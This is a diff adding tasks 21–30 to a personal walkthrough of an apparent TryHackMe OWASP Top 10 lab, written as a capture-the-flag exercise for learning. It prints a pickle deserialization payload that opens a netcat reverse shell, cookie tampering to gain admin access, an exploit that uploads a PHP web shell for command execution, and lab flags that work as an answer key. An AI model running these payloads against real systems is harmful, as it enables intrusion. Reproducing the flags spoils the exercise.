@@ -286,4 +286,183 @@ To deface a website using JS and html manipulation.
 
 ...
 
-### Task 21 - To be continued...
+### Task 21 - 26 Insecure Deserialization
+
+#### Questions
+
+...
+
+	1. Who developed the Tomcat application?
+		- Ans: The apache software foundation
+	2. What type of attack that crashes services can be performed with insecure deserialization?
+		- Ans: Denial Of Service
+	3. if a dog was sleeping, would this be:
+		- Ans: A Behaviour.
+	4. What is the name of the base-2 formatting that data is sent across a network as?
+		- Ans: Binary.
+	5. If a cookie had the path of webapp.com/login , what would the URL that the user has to visit be?
+		- Ans: webapp.com/login
+	6. What is the acronym for the web technology that Secure cookies work over?
+		- Ans: HTTPS
+...
+
+Hands on huh..
+
+Lets open the site and to being regester as some user and login. Now open your cookies stored and have alook at the session ID it seems it is encoded in base64 lets see that it decodes tp
+
+`echo 'gAN9cQAoWAkAAABzZXNzaW9uSWRxAVggAAAAZmNjOTEzNWYyMzcwNGQxZGI3NDdhZDgxNWNmMDNhZDRxAlgLAAAAZW5jb2RlZGZsYWdxA1gYAAAAVEhNe2dvb2Rfb2xkX2Jhc2U2NF9odWh9cQR1Lg==' | base64 -d`
+
+Gave me the flag along with the username that I used to register. 
+
+Now change the userType to admin and got to /admin
+
+Now you have admin dashboard access.
+
+Now use the go back to /myprofile and before that change back the userType to user.
+
+Now place copy the script on to your local system and run the script replacing your machine IP
+
+... python
+
+	import pickle
+	import sys
+	import base64
+
+	command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat YOUR_TRYHACKME_VPN_IP 4444 > /tmp/f'
+
+	class rce(object):
+    	def __reduce__(self):
+        	import os
+        	return (os.system,(command,))
+
+	print(base64.b64encode(pickle.dumps(rce()))
+
+...
+
+Replace YOUR_TRYHACK_ME_VPN_IP 
+
+`python3 rce.py`
+
+gives us cookie and now replace it in the encodedPayload package.
+
+Before hitting refresh set a netcat listen on nc -lvp [port]
+ 
+`nc -lvp [port]`
+
+Now click on 'feedback' button.
+
+Now you have reverse shell GG!
+
+...
+
+	$ pwd 
+	/home/cmnatic/app
+	$ cd ../
+	$ ls
+	app
+	flag.txt
+	launch.log
+	$ cat flag.txt
+	4a69a7ff9fd68
+...
+
+#### Questions Contd..
+
+...
+
+	7. 1st flag (cookie value)
+		- Ans: THM{good_old_base64_huh}
+	8. 2nd flag (admin dashboard)
+		- Ans: THM{heres_the_admin_flag} 
+	9. flag.txt
+		- Ans: 4a69a7ff9fd68
+
+...
+
+### Task 27-29 Components With Known Vulnerabilities
+
+Fireup the machine and try to find the hidden directories on the machine.
+
+`gobuster dir -u http://IP/ -w /usr/share/dirb/wordlists/common.txt`
+
+...
+
+	/.hta (Status: 403)
+	/.htaccess (Status: 403)
+	/.htpasswd (Status: 403)
+	/admin.php (Status: 200)
+	/controllers (Status: 301)
+	/database (Status: 301)
+	/functions (Status: 301)
+	/index.php (Status: 200)
+	/models (Status: 301)
+	/server-status (Status: 403)
+	/template (Status: 301)
+...
+
+Lets have a look at /database 
+
+Lets take a look at note.txt.txt.
+
+After performing some OSINT on the author of the note it gave us the PHP Bookstore github repo
+
+Now lets find any known exploits are available.
+
+`searchsploit book store`
+
+it gave many known vulnerabilities but most of all there is a RCE!!!!! lets go have a look at the python code...
+
+Now before running the file remeber to Comment out the first lines which werent commented out.
+
+Now run it using
+
+`python exploit.py [URL]`
+
+It gives us something like this
+...
+
+	> Attempting to upload PHP web shell...
+	> Verifying shell upload...
+	> Web shell uploaded to http://10.10.238.130/bootstrap/img/wgOkfKqM0h.php
+	> Example command usage: http://10.10.238.130/bootstrap/img/wgOkfKqM0h.php?cmd=whoami
+	> Do you wish to launch a shell here? (y/n):
+...
+
+Nice we can just go the url 
+`http://[URL]/bootstrap/img/wgOkfKqM0h.php?cmd=whoami `
+
+And replace 'whoami' command with what ever command we want to run.
+
+our command to find the number of chars in /etc/passwd file 
+
+`wc -c /etc/passwd`
+
+#### Questions
+
+...
+
+	1. How many characters are in /etc/passwd (use wc -c /etc/passwd to get the answer) 
+		- Ans: 1611
+...
+
+### Task 30 - Insufficient Logging and Monitoring 
+
+Download the file and open the logs file.
+
+#### Questions
+
+...
+
+	1. What IP address is the attacker using? 
+		- Ans: 49.99.13.16
+	2. What kind of attack is being carried out?
+		- Ans: Brute Force
+...
+
+
+
+## Thank you <3 
+
+This was a fun room but reading the description helps an individual alot by alot I mean alot.
+
+# GGWP
